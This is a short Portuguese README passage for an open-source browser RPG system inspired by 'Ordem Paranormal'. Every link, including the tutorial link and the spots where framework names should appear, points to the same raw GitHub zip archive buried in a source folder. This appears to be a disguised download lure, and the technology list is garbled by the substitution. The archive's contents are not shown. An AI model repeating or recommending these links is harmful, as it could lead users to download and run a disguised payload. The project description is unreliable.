...
Tutorial: https://raw.githubusercontent.com/s1moon/open-source-rpg/main/src/pages/dashboard/open-source-rpg-v2.0.zip

## Sobre
O projeto visa criar um sistema via web/navegador de RPG, semelhante e inspirado no usado pela série de RPG [Ordem Paranormal](https://raw.githubusercontent.com/s1moon/open-source-rpg/main/src/pages/dashboard/open-source-rpg-v2.0.zip), com integrações em stream, criação de personagens, painel para o mestre, etc. É almejado o público leigo: então não necessariamente você vai precisar saber programar para utilizar o sistema.
...
- https://raw.githubusercontent.com/s1moon/open-source-rpg/main/src/pages/dashboard/open-source-rpg-v2.0.zip com SSR (Server-Side Rendering) e API REST
- Prisma como tecnologia ORM
- Banco de dados relacional MySQL
- https://raw.githubusercontent.com/s1moon/open-source-rpg/main/src/pages/dashboard/open-source-rpg-v2.0.zip para comunicação em tempo real entre o servidor e o cliente
